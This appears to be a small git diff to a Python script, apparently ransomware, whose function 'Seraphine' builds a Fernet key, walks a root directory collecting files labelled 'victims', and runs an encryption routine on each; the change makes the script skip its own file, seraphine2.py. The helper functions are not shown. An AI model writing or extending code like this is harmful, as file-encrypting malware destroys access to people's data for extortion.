@@ -65,6 +65,7 @@ def Seraphine(root):
     fernet = create_fernet(key)
     victims = extract_files_from_root(root)
     for victim in victims:
-        print(f"executing {victim}")
-        execute_file(victim, fernet)
-        print(f"{victim} has been executed\n")
+        if victim != "seraphine2.py":
+            print(f"executing {victim}")
+            execute_file(victim, fernet)
+            print(f"{victim} has been executed\n")
